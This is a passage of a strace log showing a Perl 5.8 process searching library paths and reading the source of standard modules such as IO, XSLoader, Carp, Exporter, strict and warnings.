12268 07:41:34.876044 stat64("/usr/local/lib/perl/5.8.4", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876072 stat64("/usr/local/share/perl/5.8.4", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876083 stat64("/usr/local/lib/perl/5.8.3", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876094 stat64("/usr/local/share/perl/5.8.3", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876106 stat64("/usr/local/lib/perl/5.8.2", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876117 stat64("/usr/local/share/perl/5.8.2", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876128 stat64("/usr/local/lib/perl/5.8.1", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876139 stat64("/usr/local/share/perl/5.8.1", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876151 stat64("/usr/local/lib/perl/5.8.0", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876162 stat64("/usr/local/share/perl/5.8.0", 0xbf9c0c70) = -1 ENOENT (No such file or directory)
12268 07:41:34.876184 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0968) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.876196 _llseek(0, 0, [0], SEEK_CUR) = 0
12268 07:41:34.876208 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0968) = -1 EBADF (Bad file descriptor)
12268 07:41:34.876218 _llseek(1, 0, 0xbf9c09b0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
12268 07:41:34.876228 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0968) = -1 EINVAL (Invalid argument)
12268 07:41:34.876239 _llseek(2, 0, 0xbf9c09b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12268 07:41:34.876249 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
12268 07:41:34.876261 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0a28) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.876271 _llseek(1, 0, [0], SEEK_CUR) = 0
12268 07:41:34.876281 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
12268 07:41:34.876293 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
12268 07:41:34.876311 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
12268 07:41:34.876362 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
12268 07:41:34.876404 getppid()         = 12266
12268 07:41:34.876505 stat64("/etc/perl/IO.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876537 stat64("/etc/perl/IO.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876570 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876582 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876596 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876608 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876621 stat64("/usr/lib/perl5/IO.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876633 stat64("/usr/lib/perl5/IO.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876645 stat64("/usr/share/perl5/IO.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876657 stat64("/usr/share/perl5/IO.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876669 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876682 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
12268 07:41:34.876702 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.876716 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.876726 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.876749 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
12268 07:41:34.876805 stat64("/etc/perl/XSLoader.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876818 stat64("/etc/perl/XSLoader.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876831 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876843 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876857 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876869 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876883 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876894 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876907 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876919 stat64("/usr/share/perl5/XSLoader.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876932 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.876954 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
12268 07:41:34.877002 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.877033 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.877043 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.877061 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
12268 07:41:34.877294 brk(0x8195000)    = 0x8195000
12268 07:41:34.877646 _llseek(8, 3407, [3407], SEEK_SET) = 0
12268 07:41:34.882836 _llseek(8, 0, [3407], SEEK_CUR) = 0
12268 07:41:34.882837 close(8)          = 0
12268 07:41:34.882837 stat64("/etc/perl/Carp.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882837 stat64("/etc/perl/Carp.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882837 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882837 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882838 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882838 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882838 stat64("/usr/lib/perl5/Carp.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882838 stat64("/usr/lib/perl5/Carp.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882839 stat64("/usr/share/perl5/Carp.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882839 stat64("/usr/share/perl5/Carp.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882839 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882839 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882839 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.882840 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
12268 07:41:34.882857 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.882871 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.882882 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.882913 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
12268 07:41:34.883401 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
12268 07:41:34.883503 read(8, "", 4096) = 0
12268 07:41:34.883532 close(8)          = 0
12268 07:41:34.883567 stat64("/etc/perl/Exporter.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883581 stat64("/etc/perl/Exporter.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883594 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883607 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883620 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883634 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883647 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883659 stat64("/usr/lib/perl5/Exporter.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883672 stat64("/usr/share/perl5/Exporter.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883683 stat64("/usr/share/perl5/Exporter.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883696 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883709 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883722 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.883734 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
12268 07:41:34.883755 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.883769 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.883781 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.883797 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
12268 07:41:34.884380 _llseek(8, 2217, [2217], SEEK_SET) = 0
12268 07:41:34.884397 _llseek(8, 0, [2217], SEEK_CUR) = 0
12268 07:41:34.884407 close(8)          = 0
12268 07:41:34.884518 stat64("/etc/perl/strict.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884537 stat64("/etc/perl/strict.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884567 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884580 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884593 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884605 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884619 stat64("/usr/lib/perl5/strict.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884630 stat64("/usr/lib/perl5/strict.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884644 stat64("/usr/share/perl5/strict.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884655 stat64("/usr/share/perl5/strict.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884668 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884680 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884693 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.884705 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
12268 07:41:34.884726 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.884741 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.884752 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.884771 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
12268 07:41:34.884914 _llseek(8, 598, [598], SEEK_SET) = 0
12268 07:41:34.884928 _llseek(8, 0, [598], SEEK_CUR) = 0
12268 07:41:34.884937 close(8)          = 0
12268 07:41:34.885013 stat64("/etc/perl/warnings.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885043 stat64("/etc/perl/warnings.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885057 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885070 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885084 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885097 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885124 stat64("/usr/lib/perl5/warnings.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885135 stat64("/usr/lib/perl5/warnings.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885148 stat64("/usr/share/perl5/warnings.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885160 stat64("/usr/share/perl5/warnings.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885173 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885185 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885198 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.885211 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
12268 07:41:34.885231 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.885245 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.885256 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.885274 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    